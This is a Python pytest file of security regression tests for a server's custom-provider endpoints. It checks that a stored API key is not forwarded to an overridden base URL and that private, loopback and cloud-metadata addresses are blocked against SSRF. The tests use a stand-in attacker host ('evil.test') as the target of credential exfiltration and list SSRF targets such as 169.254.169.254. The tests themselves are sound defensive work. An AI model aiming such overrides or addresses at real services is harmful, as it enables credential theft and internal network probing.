"""Security regression tests: BYOK exfiltration and SSRF via provider test paths.

Finding: /v1/custom-providers/test and /discover-models let a caller override
the Base URL while the server silently attached the stored (decrypted) API key,
which turned the endpoints into a credential-forwarding and SSRF channel.
"""

from __future__ import annotations

import httpx
import pytest

from omninexus.providers.network import EgressError, check_host_syntax, is_blocked, parse_ip
from tests.conftest import app_client, base_config, make_transport

KEY = "sk-security-test-key"


def _recording_transport(seen: list[httpx.Request], status: int = 200):
    def handler(request: httpx.Request) -> httpx.Response:
        seen.append(request)
        if request.url.path.endswith("/models"):
            return httpx.Response(200, json={"data": [{"id": "m1"}]})
        if request.url.path.endswith("/chat/completions"):
            return httpx.Response(
                200, json={"choices": [{"message": {"content": "ok"}}]}
            )
        return httpx.Response(status, json={"ok": True})

    return make_transport(handler)


async def _create(client: httpx.AsyncClient, base_url: str, key: str | None = KEY) -> str:
    response = await client.post(
        "/v1/custom-providers",
        json={
            "name": f"probe-{base_url}",
            "baseUrl": base_url,
            "apiKey": key,
            "models": [
                {
                    "name": "m1",
                    "capabilities": {
                        "inputModalities": ["text"],
                        "contextWindow": 8192,
                        "maxOutputTokens": 512,
                    },
                }
            ],
            "defaultModel": "m1",
        },
    )
    assert response.status_code == 201, response.text
    return response.json()["provider"]["id"]


def _auth_headers(seen: list[httpx.Request]) -> list[str]:
    return [
        request.headers.get("authorization", "")
        for request in seen
        if request.url.host == "evil.test"
    ]


@pytest.mark.asyncio
async def test_unsaved_test_does_not_forward_stored_key_to_overridden_url(tmp_path) -> None:
    config = base_config(tmp_path)
    seen: list[httpx.Request] = []
    async with app_client(config, transport=_recording_transport(seen)) as (client, _):
        provider_id = await _create(client, "http://trusted.test/v1")
        seen.clear()
        response = await client.post(
            "/v1/custom-providers/test",
            json={"id": provider_id, "baseUrl": "http://evil.test/", "timeoutSeconds": 5},
        )
        assert response.status_code == 200
        assert _auth_headers(seen), "request should still be attempted"
        assert all("sk-security-test-key" not in value for value in _auth_headers(seen))


@pytest.mark.asyncio
async def test_unsaved_discovery_does_not_forward_stored_key_to_overridden_url(
    tmp_path,
) -> None:
    config = base_config(tmp_path)
    seen: list[httpx.Request] = []
    async with app_client(config, transport=_recording_transport(seen)) as (client, _):
        provider_id = await _create(client, "http://trusted.test/v1")
        seen.clear()
        response = await client.post(
            "/v1/custom-providers/discover-models",
            json={"id": provider_id, "baseUrl": "http://evil.test/", "timeoutSeconds": 5},
        )
        assert response.status_code == 200
        assert all("sk-security-test-key" not in value for value in _auth_headers(seen))


@pytest.mark.asyncio
async def test_saved_test_ignores_overridden_url_and_keeps_stored_key(tmp_path) -> None:
    config = base_config(tmp_path)
    seen: list[httpx.Request] = []
    async with app_client(config, transport=_recording_transport(seen)) as (client, _):
        provider_id = await _create(client, "http://trusted.test/v1")
        seen.clear()
        response = await client.post(
            f"/v1/custom-providers/{provider_id}/test",
            json={"baseUrl": "http://evil.test/", "timeoutSeconds": 5},
        )
        assert response.status_code == 200
        hosts = {request.url.host for request in seen}
        assert hosts == {"trusted.test"}
        assert all(
            "sk-security-test-key" in request.headers.get("authorization", "")
            for request in seen
        )


@pytest.mark.asyncio
async def test_saved_discovery_ignores_overridden_url(tmp_path) -> None:
    config = base_config(tmp_path)
    seen: list[httpx.Request] = []
    async with app_client(config, transport=_recording_transport(seen)) as (client, _):
        provider_id = await _create(client, "http://trusted.test/v1")
        seen.clear()
        response = await client.post(
            f"/v1/custom-providers/{provider_id}/discover-models",
            json={"baseUrl": "http://evil.test/", "timeoutSeconds": 5},
        )
        assert response.status_code == 200
        assert {request.url.host for request in seen} == {"trusted.test"}


@pytest.mark.asyncio
async def test_explicit_key_overriding_url_is_sent_only_to_that_url(tmp_path) -> None:
    config = base_config(tmp_path)
    seen: list[httpx.Request] = []
    async with app_client(config, transport=_recording_transport(seen)) as (client, _):
        response = await client.post(
            "/v1/custom-providers/test",
            json={
                "baseUrl": "http://explicit.test/v1",
                "apiKey": "explicit-only-key",
                "timeoutSeconds": 5,
            },
        )
        assert response.status_code == 200
        assert seen
        assert all(
            request.headers.get("authorization") == "Bearer explicit-only-key"
            for request in seen
        )


@pytest.mark.asyncio
async def test_saved_target_is_tested_with_its_stored_key(tmp_path) -> None:
    config = base_config(tmp_path)
    seen: list[httpx.Request] = []
    async with app_client(config, transport=_recording_transport(seen)) as (client, _):
        provider_id = await _create(client, "http://trusted.test/v1")
        seen.clear()
        response = await client.post(
            f"/v1/custom-providers/{provider_id}/test",
            json={"timeoutSeconds": 5},
        )
        assert response.status_code == 200
        assert all(
            request.headers.get("authorization") == f"Bearer {KEY}" for request in seen
        )


@pytest.mark.parametrize(
    "host",
    [
        "127.0.0.1",
        "127.1.2.3",
        "10.0.0.5",
        "172.16.9.9",
        "192.168.1.10",
        "169.254.169.254",
        "0.0.0.0",
        "::1",
        "fc00::1",
        "fe80::1",
        "localhost",
    ],
)
def test_private_and_loopback_targets_are_blocked(host: str) -> None:
    with pytest.raises(EgressError):
        check_host_syntax(host)


@pytest.mark.parametrize("host", ["api.example.com", "8.8.8.8", "2001:4860:4860::8888"])
def test_public_targets_pass_syntax_check(host: str) -> None:
    check_host_syntax(host)


def test_blocked_address_classification() -> None:
    assert is_blocked(parse_ip("127.0.0.1"))
    assert is_blocked(parse_ip("169.254.169.254"))
    assert is_blocked(parse_ip("::ffff:127.0.0.1"))
    assert not is_blocked(parse_ip("8.8.8.8"))


@pytest.mark.asyncio
async def test_loopback_base_url_is_rejected_by_default(tmp_path) -> None:
    config = base_config(tmp_path)
    async with app_client(config) as (client, _):
        response = await client.post(
            "/v1/custom-providers/test",
            json={"baseUrl": "http://127.0.0.1:9999/", "timeoutSeconds": 2},
        )
        assert response.status_code == 200
        result = response.json()["result"]
        assert result["status"] == "unreachable"
        assert "allow_private_targets" in result["message"]


@pytest.mark.asyncio
async def test_metadata_address_is_rejected(tmp_path) -> None:
    config = base_config(tmp_path)
    async with app_client(config) as (client, _):
        for target in ("http://169.254.169.254/latest", "http://10.0.0.1/v1"):
            response = await client.post(
                "/v1/custom-providers/discover-models",
                json={"baseUrl": target, "timeoutSeconds": 2},
            )
            assert response.status_code == 422
            assert response.json()["error"]["code"] == "EGRESS_BLOCKED"


@pytest.mark.asyncio
async def test_allow_private_targets_opt_in_restores_local_testing(tmp_path) -> None:
    config = base_config(tmp_path)
    config.server.allow_private_targets = True
    seen: list[httpx.Request] = []
    async with app_client(config, transport=_recording_transport(seen)) as (client, _):
        response = await client.post(
            "/v1/custom-providers/test",
            json={"baseUrl": "http://127.0.0.1:11434/v1", "timeoutSeconds": 2},
        )
        assert response.status_code == 200
        assert response.json()["result"]["status"] != "unreachable" or seen
